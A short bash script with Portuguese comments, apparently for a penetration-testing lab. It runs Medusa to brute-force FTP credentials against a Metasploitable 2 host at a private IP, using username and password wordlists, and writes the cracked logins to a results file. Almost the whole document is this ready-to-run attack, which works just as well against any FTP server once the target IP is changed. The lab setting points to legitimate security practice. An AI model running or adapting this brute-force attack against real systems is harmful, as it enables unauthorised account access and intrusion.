#!/bin/bash

# Script para ataque de força bruta FTP com Medusa

TARGET="192.168.56.102" # Substitua pelo IP do Metasploitable 2
USERLIST="wordlists/usernames.txt"
PASSLIST="wordlists/passwords.txt"

echo "Iniciando ataque de força bruta FTP contra $TARGET..."
medusa -h $TARGET -U $USERLIST -P $PASSLIST -M ftp -t 5 -O ftp_results.txt
echo "Ataque FTP concluído. Resultados salvos em ftp_results.txt"
